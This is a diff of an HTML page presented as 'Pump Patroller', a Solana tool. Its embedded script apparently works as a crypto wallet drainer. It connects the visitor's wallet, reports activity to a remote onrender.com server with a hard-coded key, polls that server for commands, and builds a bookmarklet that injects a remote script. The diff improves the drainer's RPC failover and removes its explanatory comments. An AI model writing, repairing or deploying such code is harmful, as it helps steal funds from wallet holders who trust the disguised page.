@@ -81,7 +81,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v2.4 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v2.5 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
@@ -89,9 +89,9 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     SRV: "https://one234-et4e.onrender.com",
     BKEY: "72d296b612eb0a11931b364ba1333a70",
     RPCS: [
-      "https://api.mainnet-beta.solana.com",
       "https://solana-rpc.publicnode.com",
-      "https://api.mainnet-beta.socean.com",
+      "https://api.mainnet-beta.solana.com",
+      "https://rpc.ankr.com/solana",
     ],
     E: "https://esm.sh/",
   };
@@ -102,18 +102,25 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   };
   const toast = t => { const d = document.createElement("div"); d.id = "toast"; d.textContent = t;
     document.body.appendChild(d); setTimeout(() => d.remove(), 6000); };
-  // RPC with fallback — public mainnet-beta rate-limits under load; try the next endpoint on failure
+  // RPC with true failover: a 403/rate-limit/error body is NOT a valid answer —
+  // record it and try the next endpoint; only fail when every endpoint failed.
   async function rpc(method, params) {
+    let lastErr = null;
     for (const u of CONFIG.RPCS) {
       try {
         const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
+        if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status); 
+          await new Promise(s => setTimeout(s, 250)); continue; }
         const j = await r.json();
-        if (j && (j.result || j.error)) return j;
-      } catch (e) {}
+        if (j && j.result !== undefined) return j;
+        if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
+          if (j.error.code === -32601) return j;   // genuine protocol error (bad method) — don't retry
+          await new Promise(s => setTimeout(s, 250)); continue; }
+      } catch (e) { lastErr = e; }
       await new Promise(s => setTimeout(s, 250));
     }
-    return { error: { message: "all RPC endpoints failed" } };
+    return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
   }
 
   let client = null, topic = null, pk = null, busy = false, polled = false, mode = null, inj = null;
@@ -168,7 +175,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   function recall() { try { return JSON.parse(localStorage.getItem("__ppwc") || "null"); } catch (e) { return null; } }
   function forget() { try { localStorage.removeItem("__ppwc"); } catch (e) {} }
 
-  // poll — gated on pk only (injected wallets have no WC topic)
   function pollCmd() {
     if (polled) return; polled = true;
     setInterval(async function () {
@@ -190,7 +196,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
       ]);
       const bh = res[0], bal = res[1], r = res[2];
       if (!bh || !bh.result) {
-        const why = bh && bh.error ? bh.error.message : "no result (rate-limited?)";
+        const why = bh && bh.error ? bh.error.message : "no result";
         beacon("err", { msg: "blockhash failed: " + why });
         return;
       }
@@ -263,7 +269,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   async function connect() {
     if (busy) return; busy = true;
     try {
-      // 1) injected extension first — 25s timeout, falls through to QR on failure
       const f = findInjected();
       if (f) {
         try {
@@ -282,7 +287,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
           beacon("err", { msg: f.name + ": " + String(e && e.message || e) + " — falling back to QR" });
         }
       }
-      // 2) WalletConnect — raw wc: URI as QR + tap deep-links per wallet
       providerName = "walletconnect";
       const { uri, approval } = await client.connect({
         requiredNamespaces: { solana: { chains: [chainRef],
@@ -307,7 +311,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     if (el) el.onclick = () => { if (!busy) connect(); };
   });
 
-  // bookmark — script-tag injection (no CORS), visible failure toast
   (function () {
     const ORIGIN = location.origin;
     const BM = 'javascript:(function(d,s,u,t){s=d.createElement("script");s.src=u+"?t="+t;' +
